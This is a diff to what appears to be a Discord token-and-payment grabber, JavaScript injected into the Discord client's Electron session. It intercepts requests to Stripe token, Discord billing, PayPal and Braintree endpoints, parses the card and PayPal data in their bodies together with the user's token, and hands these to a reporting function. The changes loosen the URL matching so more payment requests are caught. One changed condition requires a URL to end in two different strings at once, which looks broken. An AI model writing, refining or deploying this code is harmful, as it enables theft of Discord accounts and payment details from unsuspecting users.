@@ -69,12 +69,12 @@ const CONFIG = {
     },
     payment_filters: {
         urls: [
+            'https://api.stripe.com/v*/tokens',
+            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
             'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens', 
             'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
             'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',   
-            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
             'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
-            'https://api.stripe.com/v*/tokens',
         ],
     },
     badges: {
@@ -1420,7 +1420,7 @@ const defaultSession = (webRequest) => {
         const { token, user } = AuritaData;
 
         switch (true) {
-            case url.endsWith('/tokens'): {
+            case url.endsWith('tokens'): {
                 let item;
                 try {
                     item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
@@ -1451,7 +1451,7 @@ const defaultSession = (webRequest) => {
                 );
                 break;
             }
-            case (url.endsWith('/paypal_accounts') && url.endsWith('/paypal/billing-agreement-tokens')): {
+            case (url.endsWith('paypal_accounts') && url.endsWith('billing-agreement-tokens')): {
                 Cruise(
                     'PAYPAL_ADDED',
                     null,
